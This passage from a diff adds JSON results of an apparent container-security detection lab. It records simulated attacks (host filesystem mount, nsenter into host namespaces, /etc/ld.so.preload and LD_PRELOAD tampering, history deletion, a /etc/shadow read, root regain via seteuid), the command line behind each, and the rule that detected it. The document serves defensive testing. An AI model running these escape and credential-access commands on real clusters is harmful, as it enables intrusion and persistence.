+          "event": "{\"ts\":\"2026-11-25T14:02:07.068779Z\",\"type\":\"module_load\",\"node\":\"tephra-worker2\",\"rule\":{\"id\":\"R016\",\"title\":\"Kernel module loaded while a container process is current\",\"level\":\"critical\",\"tags\":[\"attack.persistence\",\"attack.t1547.006\"]},\"process\":{\"pid\":21424,\"start_time_ns\":806888221537,\"Image\":\"/usr/local/bin/python3\",\"CommandLine\":\"python3 -\",\"uid\":0,\"gid\":0,\"cgroup_id\":21782,\"identity\":\"interpreter\",\"tree\":\"21418.806884149498\"},\"parent\":{\"pid\":21418,\"Image\":\"/bin/sh\",\"CommandLine\":\"sh -s\",\"identity\":\"shell\",\"is_main_binary\":true},\"ancestors\":[\"/bin/sh\",\"/usr/local/bin/containerd-shim-runc-v2\",\"/usr/lib/systemd/systemd\"],\"container\":{\"id\":\"1a590ea8367af049d35fdf5eb44005c21113d5572ed8401f6c22969a855f7b93\",\"name\":\"victim\",\"image\":\"docker.io/library/python:3.14-alpine\"},\"k8s\":{\"namespace\":\"tephra-a14-fea3e9\",\"pod\":\"victim\",\"labels\":{\"app\":\"victim\"}},\"module\":{\"name\":\"dummy\"}}"
+        }
+      ],
+      "visible_ms": 2219,
+      "ring_buffer_drops": 0,
+      "note": "Loads the kernel's own dummy network driver into the lab VM's kernel and removes it again."
+    },
+    {
+      "id": "A15",
+      "title": "Mount the host root filesystem from a privileged pod",
+      "tags": [
+        "attack.privilege_escalation",
+        "attack.t1611"
+      ],
+      "rules": [
+        {
+          "rule": "R017",
+          "verdict": "detected",
+          "latency_ms": 54,
+          "event": "{\"ts\":\"2026-11-25T14:02:21.649118Z\",\"type\":\"mount\",\"node\":\"tephra-worker2\",\"rule\":{\"id\":\"R017\",\"title\":\"mount called from inside a container\",\"level\":\"high\",\"tags\":[\"attack.privilege_escalation\",\"attack.t1611\"]},\"process\":{\"pid\":21934,\"start_time_ns\":821594766606,\"Image\":\"/bin/mount\",\"CommandLine\":\"mount -o ro /dev/root /mnt/host\",\"uid\":0,\"gid\":0,\"cgroup_id\":21977,\"tree\":\"21926.821589268773\"},\"parent\":{\"pid\":21926,\"Image\":\"/bin/sh\",\"CommandLine\":\"sh -s\",\"identity\":\"shell\",\"is_main_binary\":true},\"ancestors\":[\"/bin/sh\",\"/usr/local/bin/containerd-shim-runc-v2\",\"/usr/lib/systemd/systemd\"],\"container\":{\"id\":\"8ffcaf1ed42cf0065431973bc18cef58f3d03d2f86a9a1dbba505b2eca5e590b\",\"name\":\"victim\",\"image\":\"docker.io/library/busybox:1.37\"},\"k8s\":{\"namespace\":\"tephra-a15-b061f1\",\"pod\":\"victim\",\"labels\":{\"app\":\"victim\"}},\"mount\":{\"fstype\":\"ext3\",\"flags\":32769,\"target\":\"/mnt/host\"}}"
+        }
+      ],
+      "visible_ms": 2086,
+      "ring_buffer_drops": 0
+    },
+    {
+      "id": "A16",
+      "title": "Enter host namespaces with nsenter from a hostPID pod",
+      "tags": [
+        "attack.privilege_escalation",
+        "attack.t1611"
+      ],
+      "rules": [
+        {
+          "rule": "R018",
+          "verdict": "detected",
+          "latency_ms": 51,
+          "event": "{\"ts\":\"2026-11-25T14:02:38.664316Z\",\"type\":\"setns\",\"node\":\"tephra-worker2\",\"rule\":{\"id\":\"R018\",\"title\":\"Process entered one of the node's own namespaces\",\"level\":\"critical\",\"tags\":[\"attack.privilege_escalation\",\"attack.t1611\"]},\"process\":{\"pid\":22174,\"start_time_ns\":838609941867,\"Image\":\"/bin/nsenter\",\"CommandLine\":\"nsenter -t 1 -m -u -i -n -p true\",\"uid\":0,\"gid\":0,\"cgroup_id\":22172,\"tree\":\"22168.838606161512\"},\"parent\":{\"pid\":22168,\"Image\":\"/bin/sh\",\"CommandLine\":\"sh -s\",\"identity\":\"shell\"},\"ancestors\":[\"/bin/sh\",\"/usr/local/sbin/runc\",\"/usr/local/bin/containerd-shim-runc-v2\",\"/usr/lib/systemd/systemd\"],\"container\":{\"id\":\"0bd6598df53f0ad8d2aa6236c160ce315d8012aa44ff844804d9db8f8226e779\",\"name\":\"victim\",\"image\":\"docker.io/library/busybox:1.37\"},\"k8s\":{\"namespace\":\"tephra-a16-451084\",\"pod\":\"victim\",\"labels\":{\"app\":\"victim\"}},\"namespaces\":{\"changed\":[\"ipc\"],\"host\":[\"ipc\"]}}"
+        }
+      ],
+      "visible_ms": 2082,
+      "ring_buffer_drops": 0
+    },
+    {
+      "id": "A17",
+      "title": "Load a BPF program with a second tool",
+      "tags": [
+        "attack.defense_evasion",
+        "attack.t1562.001"
+      ],
+      "rules": [
+        {
+          "rule": "R020",
+          "verdict": "detected",
+          "latency_ms": 95,
+          "event": "{\"ts\":\"2026-11-25T14:02:51.408649Z\",\"type\":\"bpf_load\",\"node\":\"tephra-worker2\",\"rule\":{\"id\":\"R020\",\"title\":\"BPF program loaded by something other than the sensor\",\"level\":\"high\",\"tags\":[\"attack.defense_evasion\",\"attack.t1562.001\"]},\"process\":{\"pid\":22401,\"start_time_ns\":851312286222,\"Image\":\"/usr/local/bin/python3\",\"CommandLine\":\"python3 -\",\"uid\":0,\"gid\":0,\"cgroup_id\":22367,\"identity\":\"interpreter\",\"tree\":\"22395.851308338983\"},\"parent\":{\"pid\":22395,\"Image\":\"/bin/sh\",\"CommandLine\":\"sh -s\",\"identity\":\"shell\",\"is_main_binary\":true},\"ancestors\":[\"/bin/sh\",\"/usr/local/bin/containerd-shim-runc-v2\",\"/usr/lib/systemd/systemd\"],\"container\":{\"id\":\"ccdc66a2ce728a09889d19b8e6df5e4ab41d6a67e2c16c7edda9eca91a4c98e2\",\"name\":\"victim\",\"image\":\"docker.io/library/python:3.14-alpine\"},\"k8s\":{\"namespace\":\"tephra-a17-7686a7\",\"pod\":\"victim\",\"labels\":{\"app\":\"victim\"}},\"bpf\":{\"prog_type\":1}}"
+        }
+      ],
+      "visible_ms": 1119,
+      "ring_buffer_drops": 0
+    },
+    {
+      "id": "A18",
+      "title": "Delete shell history and link it to /dev/null",
+      "tags": [
+        "attack.defense_evasion",
+        "attack.t1070.003"
+      ],
+      "rules": [
+        {
+          "rule": "R022",
+          "verdict": "detected",
+          "latency_ms": 53,
+          "event": "{\"ts\":\"2026-11-25T14:03:04.959707Z\",\"type\":\"file_change\",\"node\":\"tephra-worker2\",\"rule\":{\"id\":\"R022\",\"title\":\"Shell history removed or replaced\",\"level\":\"low\",\"tags\":[\"attack.defense_evasion\",\"attack.t1070.003\"]},\"process\":{\"pid\":22619,\"start_time_ns\":864905425324,\"Image\":\"/bin/rm\",\"CommandLine\":\"rm /root/.ash_history\",\"uid\":0,\"gid\":0,\"cgroup_id\":22562,\"tree\":\"22613.864901300769\"},\"parent\":{\"pid\":22613,\"Image\":\"/bin/sh\",\"CommandLine\":\"sh -s\",\"identity\":\"shell\",\"is_main_binary\":true},\"ancestors\":[\"/bin/sh\",\"/usr/local/bin/containerd-shim-runc-v2\",\"/usr/lib/systemd/systemd\"],\"container\":{\"id\":\"133d924a94fc00be79e5ef88fe12b2b812cba734d68404236359bbddb582677a\",\"name\":\"victim\",\"image\":\"docker.io/library/busybox:1.37\"},\"k8s\":{\"namespace\":\"tephra-a18-917ea0\",\"pod\":\"victim\",\"labels\":{\"app\":\"victim\"}},\"file\":{\"path\":\"/root/.ash_history\",\"flags\":0,\"write\":true,\"truncate\":false,\"inode\":2108689,\"dev\":351,\"matched_by\":\"name\",\"op\":\"unlink\"}}"
+        }
+      ],
+      "visible_ms": 2084,
+      "ring_buffer_drops": 0
+    },
+    {
+      "id": "A19",
+      "title": "Move a file onto /etc/ld.so.preload",
+      "tags": [
+        "attack.persistence",
+        "attack.t1574.006"
+      ],
+      "rules": [
+        {
+          "rule": "R023",
+          "verdict": "detected",
+          "latency_ms": 52,
+          "event": "{\"ts\":\"2026-11-25T14:03:21.492370Z\",\"type\":\"file_change\",\"node\":\"tephra-worker2\",\"rule\":{\"id\":\"R023\",\"title\":\"Sensitive file put in place without being opened\",\"level\":\"high\",\"tags\":[\"attack.persistence\",\"attack.t1574.006\"]},\"process\":{\"pid\":23110,\"start_time_ns\":881438033458,\"Image\":\"/bin/mv\",\"CommandLine\":\"mv /tmp/preload /etc/ld.so.preload\",\"uid\":0,\"gid\":0,\"cgroup_id\":22757,\"tree\":\"23104.881434240787\"},\"parent\":{\"pid\":23104,\"Image\":\"/bin/sh\",\"CommandLine\":\"sh -s\",\"identity\":\"shell\",\"is_main_binary\":true},\"ancestors\":[\"/bin/sh\",\"/usr/local/sbin/runc\",\"/usr/local/bin/containerd-shim-runc-v2\",\"/usr/lib/systemd/systemd\"],\"container\":{\"id\":\"d029ec5df5dcbf366217cdd5b275469480ddc01730961d746afac471e82c8406\",\"name\":\"victim\",\"image\":\"docker.io/library/busybox:1.37\"},\"k8s\":{\"namespace\":\"tephra-a19-bbf897\",\"pod\":\"victim\",\"labels\":{\"app\":\"victim\"}},\"file\":{\"path\":\"/etc/ld.so.preload\",\"flags\":0,\"write\":true,\"truncate\":false,\"inode\":0,\"dev\":0,\"matched_by\":\"path\",\"op\":\"rename_to\"}}"
+        }
+      ],
+      "visible_ms": 2086,
+      "ring_buffer_drops": 0
+    },
+    {
+      "id": "A20",
+      "title": "Refused read of /etc/shadow by an unprivileged user",
+      "tags": [
+        "attack.credential_access",
+        "attack.t1003.008"
+      ],
+      "rules": [
+        {
+          "rule": "R024",
+          "verdict": "detected",
+          "latency_ms": 51,
+          "event": "{\"ts\":\"2026-11-25T14:03:38.891753Z\",\"type\":\"file_denied\",\"node\":\"tephra-worker2\",\"rule\":{\"id\":\"R024\",\"title\":\"Refused attempt to open a sensitive file\",\"level\":\"medium\",\"tags\":[\"attack.credential_access\",\"attack.t1003.008\"]},\"process\":{\"pid\":23333,\"start_time_ns\":898837379487,\"Image\":\"/bin/cat\",\"CommandLine\":\"cat /etc/shadow\",\"uid\":1000,\"gid\":0,\"cgroup_id\":22952,\"tree\":\"23327.898833529358\"},\"parent\":{\"pid\":23327,\"Image\":\"/bin/sh\",\"CommandLine\":\"sh -s\",\"identity\":\"shell\",\"is_main_binary\":true},\"ancestors\":[\"/bin/sh\",\"/usr/local/bin/containerd-shim-runc-v2\",\"/usr/lib/systemd/systemd\"],\"container\":{\"id\":\"a2bbcadcdd19e6b7f4b7a3608a817b3902896c20efd33c230207822c26995f6e\",\"name\":\"victim\",\"image\":\"docker.io/library/busybox:1.37\"},\"k8s\":{\"namespace\":\"tephra-a20-9d1461\",\"pod\":\"victim\",\"labels\":{\"app\":\"victim\"}},\"file\":{\"path\":\"/etc/shadow\",\"flags\":32768,\"write\":false,\"truncate\":false,\"inode\":0,\"dev\":0,\"matched_by\":\"path\",\"error\":\"EACCES\"}}"
+        }
+      ],
+      "visible_ms": 2081,
+      "ring_buffer_drops": 0
+    },
+    {
+      "id": "A21",
+      "title": "Start a program with LD_PRELOAD set",
+      "tags": [
+        "attack.persistence",
+        "attack.t1574.006"
+      ],
+      "rules": [
+        {
+          "rule": "R021",
+          "verdict": "detected",
+          "latency_ms": 55,
+          "event": "{\"ts\":\"2026-11-25T14:03:55.967568Z\",\"type\":\"exec\",\"node\":\"tephra-worker2\",\"rule\":{\"id\":\"R021\",\"title\":\"Program started in a container with a dynamic loader override\",\"level\":\"medium\",\"tags\":[\"attack.persistence\",\"attack.t1574.006\"]},\"process\":{\"pid\":23559,\"start_time_ns\":915913521793,\"Image\":\"/bin/true\",\"CommandLine\":\"/bin/true\",\"uid\":0,\"gid\":0,\"cgroup_id\":23212,\"tree\":\"23553.915909566832\",\"stdin_is_socket\":false,\"stdout_is_socket\":false,\"unlinked\":false,\"setuid\":false,\"argv_truncated\":false,\"inode\":2095992,\"dev\":351,\"cap_effective\":2818844155,\"exe_ctime_ns\":1795614839590074632,\"env\":{\"LD_PRELOAD\":\"/tmp/tephra-lab-missing.so\"},\"env_truncated\":false},\"parent\":{\"pid\":23553,\"Image\":\"/bin/sh\",\"CommandLine\":\"sh -s\",\"identity\":\"shell\",\"is_main_binary\":true},\"ancestors\":[\"/bin/sh\",\"/usr/local/sbin/runc\",\"/usr/local/bin/containerd-shim-runc-v2\",\"/usr/lib/systemd/systemd\"],\"container\":{\"id\":\"5f849260b3222926f55770c43386c5b0f78e4e4b4452637a96cbf6db2501ed06\",\"name\":\"victim\",\"image\":\"docker.io/library/busybox:1.37\"},\"k8s\":{\"namespace\":\"tephra-a21-d70fc3\",\"pod\":\"victim\",\"labels\":{\"app\":\"victim\"}}}"
+        }
+      ],
+      "visible_ms": 2084,
+      "ring_buffer_drops": 0
+    },
+    {
+      "id": "A22",
+      "title": "Effective uid goes from non-zero to zero outside an exec",
+      "tags": [
+        "attack.privilege_escalation",
+        "attack.t1068"
+      ],
+      "rules": [
+        {
+          "rule": "R019",
+          "verdict": "detected",
+          "latency_ms": 71,
+          "event": "{\"ts\":\"2026-11-25T14:04:13.323420Z\",\"type\":\"cred_change\",\"node\":\"tephra-worker2\",\"rule\":{\"id\":\"R019\",\"title\":\"Process became root without running a setuid binary\",\"level\":\"critical\",\"tags\":[\"attack.privilege_escalation\",\"attack.t1068\"]},\"process\":{\"pid\":23780,\"start_time_ns\":933252657431,\"Image\":\"/usr/local/bin/python3\",\"CommandLine\":\"python3 -c import os; os.seteuid(1000); os.seteuid(0)\",\"uid\":0,\"gid\":0,\"cgroup_id\":23440,\"identity\":\"interpreter\",\"tree\":\"23774.933249013514\"},\"parent\":{\"pid\":23774,\"Image\":\"/bin/sh\",\"CommandLine\":\"sh -s\",\"identity\":\"shell\",\"is_main_binary\":true},\"ancestors\":[\"/bin/sh\",\"/usr/local/bin/containerd-shim-runc-v2\",\"/usr/lib/systemd/systemd\"],\"container\":{\"id\":\"6d181655d466b5db4f38fbb238f3115612b145d645afe85fcd744f9dfffa5f2f\",\"name\":\"victim\",\"image\":\"docker.io/library/python:3.14-alpine\"},\"k8s\":{\"namespace\":\"tephra-a22-a893b9\",\"pod\":\"victim\",\"labels\":{\"app\":\"victim\"}},\"cred\":{\"old_uid\":0,\"new_uid\":0,\"old_euid\":1000,\"new_euid\":0,\"old_gid\":0,\"new_gid\":0,\"in_exec\":false,\"caps_gained\":true,\"old_cap_effective\":0,\"new_cap_effective\":2818844155}}"
+        }
+      ],
+      "visible_ms": 2103,
+      "ring_buffer_drops": 0
+    }
+  ]
+}
